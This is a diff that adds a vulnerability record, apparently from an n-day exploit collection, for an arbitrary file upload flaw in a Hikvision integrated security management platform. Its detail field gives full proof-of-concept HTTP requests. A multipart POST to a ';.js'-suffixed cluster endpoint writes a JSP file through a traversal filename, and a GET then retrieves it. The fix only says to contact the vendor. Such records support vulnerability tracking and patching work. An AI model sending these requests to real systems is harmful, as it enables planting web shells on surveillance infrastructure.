@@ -1,0 +1,18 @@
+vendor = "海康威视"
+name = "海康威视综合安防管理平台 clusters 接口任意文件上传漏洞"
+type = "任意文件上传"
+path = "/clusterMgr/clusters/ssl/file;.js"
+version = "8.8.8"
+detail = """POST /clusterMgr/clusters/ssl/file;.js HTTP/1.1 Host: target:1443 Content-Type: multipart/form-data; boundary=----Boundary
+
+------Boundary
+Content-Disposition: form-data; name="file"; filename="languages/shell.jsp"
+<% out.println("test"); %>
+------Boundary--
+
+GET /clusterMgr/languages/shell.jsp;.js HTTP/1.1 Host: target:1443"""
+fix = "联系厂商获取补丁"
+date = 20251017
+label = "nday"
+cve = "TVD-2026-XXXXX"
+verifier = "AdySec"
